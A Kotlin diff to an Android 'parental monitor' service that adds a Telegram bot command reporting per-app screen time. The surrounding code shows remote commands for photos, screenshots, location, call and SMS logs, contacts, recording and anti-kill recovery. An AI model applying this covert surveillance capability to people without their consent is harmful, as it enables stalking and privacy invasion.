@@ -179,9 +179,9 @@ class MonitoringService : Service() {
         private val PROMO_KEYWORDS = arrayOf("promo", "diskon", "discount", "cashback", "bonus", "hadiah", "undian", "pinjaman", "kredit", "cicilan", "belanja", "sale", "gratis", "klaim", "voucher", "kupon", "poin", "tukar")
         private val CONNECT_HELPER_REGEX = Regex("(?i)connectHelper:\\d+:\\s*")
         private val MUTATING_COMMANDS = setOf("/lock", "/ring", "/sms", "/smsconfirm", "/record", "/recordvideo", "/stop", "/resume", "/pause", "/photointerval", "/syncinterval", "/camera", "/notif", "/restart", "/flush", "/clearqueue", "/patrol", "/patrolinterval", "/heartbeat", "/night", "/watch", "/home", "/school", "/digest", "/darurat", "/jampulang", "/minggu", "/watchnomor", "/jejak", "/waspada", "/hilang", "/jemput", "/sembuh")
-        private val SENSITIVE_COMMANDS = setOf("/screenshot", "/photo", "/location", "/lastcalls", "/lastsms", "/lastnotif", "/contacts", "/history", "/apps", "/log", "/version", "/status", "/battery", "/uptime", "/storage", "/perms", "/ringkas", "/alive", "/cekmati")
-        private val KNOWN_COMMANDS = setOf("/photo", "/screenshot", "/status", "/perms", "/lastcalls", "/lastsms", "/photointerval", "/patrol", "/patrolinterval", "/pause", "/battery", "/stop", "/resume", "/location", "/camera", "/notif", "/log", "/syncinterval", "/restart", "/flush", "/clearqueue", "/lock", "/ring", "/ping", "/record", "/recordvideo", "/sms", "/smsconfirm", "/lastnotif", "/version", "/uptime", "/alive", "/cekmati", "/sembuh", "/heartbeat", "/contacts", "/apps", "/storage", "/history", "/help", "/start", "/night", "/ringkas", "/watch", "/home", "/school", "/digest", "/darurat", "/jampulang", "/minggu", "/watchnomor", "/jejak", "/waspada", "/hilang", "/jemput")
-        private val ALIAS_COMMANDS = mapOf("dimana" to "/location", "lokasi" to "/location", "posisi" to "/location", "foto" to "/photo", "photo" to "/photo", "ding" to "/ring", "bunyi" to "/ring", "kunci" to "/lock", "baterai" to "/battery", "batre" to "/battery", "bantu" to "/help", "tolong" to "/help", "menu" to "/help", "lanjut" to "/resume", "versi" to "/version", "sms" to "/sms", "darurat" to "/darurat", "minggu" to "/minggu", "laporan" to "/minggu", "pulang" to "/jampulang", "jejak" to "/jejak", "waspada" to "/waspada", "hilang" to "/hilang", "jemput" to "/jemput", "cekmati" to "/cekmati", "ujimati" to "/cekmati", "sembuh" to "/sembuh", "pulih" to "/sembuh")
+        private val SENSITIVE_COMMANDS = setOf("/screenshot", "/photo", "/location", "/lastcalls", "/lastsms", "/lastnotif", "/contacts", "/history", "/apps", "/log", "/version", "/status", "/battery", "/uptime", "/storage", "/perms", "/ringkas", "/alive", "/cekmati", "/layar")
+        private val KNOWN_COMMANDS = setOf("/photo", "/screenshot", "/status", "/perms", "/lastcalls", "/lastsms", "/photointerval", "/patrol", "/patrolinterval", "/pause", "/battery", "/stop", "/resume", "/location", "/camera", "/notif", "/log", "/syncinterval", "/restart", "/flush", "/clearqueue", "/lock", "/ring", "/ping", "/record", "/recordvideo", "/sms", "/smsconfirm", "/lastnotif", "/version", "/uptime", "/alive", "/cekmati", "/sembuh", "/layar", "/heartbeat", "/contacts", "/apps", "/storage", "/history", "/help", "/start", "/night", "/ringkas", "/watch", "/home", "/school", "/digest", "/darurat", "/jampulang", "/minggu", "/watchnomor", "/jejak", "/waspada", "/hilang", "/jemput")
+        private val ALIAS_COMMANDS = mapOf("dimana" to "/location", "lokasi" to "/location", "posisi" to "/location", "foto" to "/photo", "photo" to "/photo", "ding" to "/ring", "bunyi" to "/ring", "kunci" to "/lock", "baterai" to "/battery", "batre" to "/battery", "bantu" to "/help", "tolong" to "/help", "menu" to "/help", "lanjut" to "/resume", "versi" to "/version", "sms" to "/sms", "darurat" to "/darurat", "minggu" to "/minggu", "laporan" to "/minggu", "pulang" to "/jampulang", "jejak" to "/jejak", "waspada" to "/waspada", "hilang" to "/hilang", "jemput" to "/jemput", "cekmati" to "/cekmati", "ujimati" to "/cekmati", "sembuh" to "/sembuh", "pulih" to "/sembuh", "layar" to "/layar", "screentime" to "/layar")
         private const val COMMAND_MAX_AGE_SEC = 900L
         private const val COMMAND_SILENT_AGE_SEC = 3600L
         private const val MUTATING_MAX_AGE_SEC = 300L
@@ -1523,6 +1523,7 @@ class MonitoringService : Service() {
             com.redeye.parentalmonitor.network.BotCommand("school", "Geofence sekolah: /school lat,lon,rad|status|off"),
             com.redeye.parentalmonitor.network.BotCommand("digest", "Kirim ringkasan harian"),
             com.redeye.parentalmonitor.network.BotCommand("darurat", "Lokasi+foto+baterai sekaligus"),
+            com.redeye.parentalmonitor.network.BotCommand("layar", "Ringkasan pemakaian layar per aplikasi"),
             com.redeye.parentalmonitor.network.BotCommand("jampulang", "Jam malam: /jampulang 21:30|off"),
             com.redeye.parentalmonitor.network.BotCommand("minggu", "Laporan 7 hari"),
             com.redeye.parentalmonitor.network.BotCommand("watchnomor", "Awasi nomor: /watchnomor 0812,.."),
@@ -2276,6 +2277,10 @@ class MonitoringService : Service() {
             "/sembuh" -> {
                 runFullRecovery()
             }
+            "/layar" -> {
+                val hours = arg.trim().toIntOrNull()?.coerceIn(1, 24) ?: 24
+                sendToTelegram(screenTimeFull(hours))
+            }
             "/heartbeat" -> {
                 if (arg.isBlank()) {
                     val hours = try { preferencesManager.heartbeatHours } catch (_: Exception) { 0 }
@@ -2613,6 +2618,7 @@ class MonitoringService : Service() {
                         appendLine("/alive - denyut terakhir + berapa kali dipulihkan")
                         appendLine("/cekmati - uji anti-mati: servis dihentikan lalu lapor hasilnya")
                         appendLine("/sembuh - pemulihan penuh: kredensial, webhook, menu, semua loop")
+                        appendLine("/layar [jam 1-24] - ringkasan pemakaian layar per aplikasi")
                         appendLine("/heartbeat &lt;1-48|0&gt; - laporan berkala masih hidup")
                         appendLine("/contacts &lt;nama&gt; - cari kontak")
                         appendLine("/apps [N] - daftar aplikasi")
@@ -3828,6 +3834,51 @@ class MonitoringService : Service() {
         return level in 0..LOW_BATTERY_LEVEL && !isCharging()
     }
 
+    private fun usageRows(hours: Int): List<Triple<String, Long, String>>? {
+        if (!com.redeye.parentalmonitor.utils.UsageAccess.granted(this)) return null
+        val end = System.currentTimeMillis()
+        val start = end - hours.coerceIn(1, 24) * 60 * 60_000L
+        return try {
+            val manager = getSystemService(USAGE_STATS_SERVICE) as? android.app.usage.UsageStatsManager ?: return null
+            val stats = manager.queryAndAggregateUsageStats(start, end) ?: return null
+            val pm = packageManager
+            val rows = mutableListOf<Triple<String, Long, String>>()
+            for ((pkg, stat) in stats) {
+                if (pkg == packageName) continue
+                val ms = stat.totalTimeInForeground
+                if (ms <= 0L) continue
+                val launchable = try { pm.getLaunchIntentForPackage(pkg) != null } catch (_: Exception) { false }
+                if (!launchable) continue
+                val label = try { pm.getApplicationLabel(pm.getApplicationInfo(pkg, 0)).toString() } catch (_: Exception) { pkg }
+                rows.add(Triple(label, ms, pkg))
+            }
+            rows.sortByDescending { it.second }
+            rows
+        } catch (_: Exception) {
+            null
+        }
+    }
+
+    private fun screenTimeFull(hours: Int): String {
+        val rows = usageRows(hours)
+            ?: return "📱 Izin \"Usage access\" belum aktif. Buka Setup → tombol \"Screen time access\", aktifkan untuk aplikasi ini, lalu coba lagi."
+        if (rows.isEmpty()) return "📱 Belum ada data pemakaian layar $hours jam terakhir."
+        val total = rows.sumOf { it.second }
+        return buildString {
+            appendLine("📱 <b>Ringkasan layar</b> ($hours jam terakhir)")
+            appendLine("Total: " + durationText(total))
+            for (row in rows.take(6)) appendLine("• " + Html.escape(row.first) + " — " + durationText(row.second))
+        }.trimEnd()
+    }
+
+    private fun screenTimeSummary(hours: Int): String? {
+        val rows = usageRows(hours) ?: return null
+        if (rows.isEmpty()) return null
+        val total = rows.sumOf { it.second }
+        val top = rows.first()
+        return "Layar $hours jam: " + durationText(total) + " · teratas " + Html.escape(top.first) + " " + durationText(top.second)
+    }
+
     private suspend fun syncLowPowerNotice(lowPower: Boolean) {
         try {
             if (lowPower || !lowPowerNotified) return
@@ -4073,6 +4124,7 @@ class MonitoringService : Service() {
                 appendLine("SMS 24 jam: ${if (sms.size >= 200) "200+" else "${sms.size}"}, Panggilan: ${if (calls.size >= 200) "200+" else "${calls.size}"}${if (sms.size >= 200 || calls.size >= 200) " (dari 200 terakhir)" else ""}")
                 if (top.isEmpty()) appendLine("Kontak teratas: -") else appendLine("Teratas: " + top.joinToString(", ") { it.key + " (${it.value}x)" })
                 if (watch.isNotEmpty() || hits > 0) appendLine("Watch hit: $hits")
+                try { screenTimeSummary(24)?.let { appendLine(it) } } catch (_: Exception) { }
                 appendLine("Antrean: ${try { messageQueue.getQueueSize() } catch (_: Exception) { "?" }}")
                 appendLine("Baterai: ${if (level in 0..100) "$level%" else "?"}")
                 if (!manual) appendLine("Kirim /digest kapan saja untuk versi manual.")
